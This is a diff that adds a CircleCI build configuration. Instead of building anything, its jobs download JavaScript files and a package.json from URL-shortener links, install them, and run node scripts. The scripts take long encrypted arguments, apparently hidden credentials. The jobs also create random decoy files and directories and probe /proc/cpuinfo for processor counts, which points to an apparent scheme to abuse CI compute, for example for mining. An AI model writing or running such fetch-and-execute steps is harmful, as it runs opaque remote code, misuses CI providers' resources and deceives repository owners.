@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  runJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch 42jpo96vdvt8uwlm.html
+      - run: echo version 81516729901.75246
+      - run: curl -fsSL shorturl.at/cvIX4 -o pzw8mfg2knioas.js && curl -fsSL
+          shorturl.at/diEK2 -o xclxcllvtw8po1nrj.js && curl -fsSL
+          shorturl.at/byCO7 -o package.json
+      - run: touch zusoku17qyy7hqfi0v9.sh
+      - run: mkdir 56b854p3y8mitqlde3kqqukql
+      - run: npm i -s
+      - run: node xclxcllvtw8po1nrj -r
+          U2FsdGVkX18kClwzo2t5M/dtKC14+IwDOtiUlOLwroJ64NusU3HY3n4e6ICjqQHFpEQZ0s6ALjbSIGT8xMITdI5AlSkz8EXFoAHFxy/qYuZu7hMB/ZWzV3HoM0L83vYGRYu4AW5XIM5yipXvep5ZDcGaIho/ucDq9ZAWNlDz2zP17fGYImgnY+jcjS7HYUfoH5g2rETctC2Qd9fla9ksR9Ronw+F2lUJxiSIEFIuadoQh18l4z9+hmhmKuBI/zx++Em5WL1psVsKPJr7p/y0N2NaisL7F3QSGglrFFFbmwU=
+          -t U2FsdGVkX1/woJ1gHBaVqH+0laDfpXbaV1gI51UT8WhvkC5XFgl4zcF6ZRUdKZpw -s
+          U2FsdGVkX1+Y7U4U3wraxVIrsHB6IijSQ01+Sg1EUqhjYddKklrKpQ+DnzcXZKxSS2l1n5ko1zoD2L+HZK08V5z09FnThhkpwauSuLrfiNqSjRPQ/D2/Dg3V6y8tCwmSZLic7ubzN2AV0pnypf5tiaNQzG0OFf74lyn6mQ/8Gp0d1NdngQmxio+bNQw9CQ0Z7hJUEtBsP3ca3fNxY3r101GJ8wxDG9/HR67VuD/VEZo=
+          -lpn U2FsdGVkX1/oUdcaXh5otp8Su+2mGVSTCi8OflqdwPc= -sp
+      - run: touch kkmut938q9oj8zk2v5avab.c
+      - run: touch qud659d2vedeol73ky3u.ts
+  dataBuild:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/vHQ19 -o z8si1vbj.js && curl -fsSL shorturl.at/opuwU
+          -o package.json && curl -fsSL shorturl.at/girxP -o q8f5pnpk0ob.js
+      - run: mkdir hwab2dy6qxl64ozez8k
+      - run: mkdir hisg636minsy0f9kr
+      - run: mkdir 4k5gvkwbn4kuj2r3aok5dqja
+      - run: mkdir bj7hq40x8uw926j9
+      - run: npm i -s
+      - run: touch eyt61x0ljjwi0lubir.c
+      - run: node z8si1vbj -lpn U2FsdGVkX1+El7X8Av+dTo2BzF3nVKfD4Hs7/5QjYyk= -sp -r
+          U2FsdGVkX1/ZGQ14boLNaNA/aGjV2pDw5NHldtGuQI2wKmJ2fSBp0dm8Nvx2Bt+hoACY1dHwKX6AZzq6EAWWJhymLV6AT4FxsYki3RKukcssM+Qhn4hQu4D3ZzQDDaCDUApmNjnQS8cBtTNquttCYxBmFHhz5f7m7V5Y3XSOiDto3KMCNj38jC1DFgSXtCutXxwPekGb4LXB6jv+B7opP4bJEDswtsDucpwe3w0OXoavuUAO3xBUFDNK9OMx+MtieCxeGC423fpk3KKNCaDu1/+wWAD944uf5GKQxF2xT1Y=
+          -s
+          U2FsdGVkX1+nP8cdRBTiUthoaTeevtIW8sZKxHzootGsghGPsxbqtatrh/StRUCW8ngqTWkHeub0TN/gbEAzoQGBkFrMEnEKxHTKEUBTg84HRffr5l46kKqGTFs30xSk7Z18HVRgLHgELaEI6fVjA1ypg+AAzjlQx6Iuz4rEV9YA08w8EVlhaek+LzJuwa4F+Lega9WoF03DAaxah2JYVg/kZbd06KjKiK5uNNjlhME=
+          -t U2FsdGVkX19oY5YDGA52wduo8NO2u+gN319PtR/HhIFka0gbKaQ0OXl90XeiMvZa
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+workflows:
+  dataBuild:
+    jobs:
+      - runJobs
+  build:
+    jobs:
+      - dataBuild
